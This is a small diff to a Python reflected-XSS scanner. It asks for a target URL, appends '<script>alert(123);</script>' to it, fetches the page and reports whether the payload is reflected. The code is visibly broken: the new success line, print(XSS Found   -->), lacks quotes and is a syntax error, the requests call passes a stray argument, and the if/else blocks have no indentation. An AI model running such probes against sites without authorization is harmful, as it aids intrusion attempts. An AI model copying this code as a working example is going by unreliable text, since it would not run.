@@ -17,10 +17,10 @@ ________
         """ + Fore.RESET)
 
 url = input("Please Enter Target Ur")
-payload = ["<script>alert(123);</script>"]
+payload = "<script>alert(123);</script>"
 req=requests.get(url+payload,"html.parser").text;
 print(url+payload)
 if payload in req:
-print(Fore.GREEN +'XSS Found   -->','   ' , f"{url}" + Fore.RESET)
+print(XSS Found   -->)
 else:
 print("no xss")
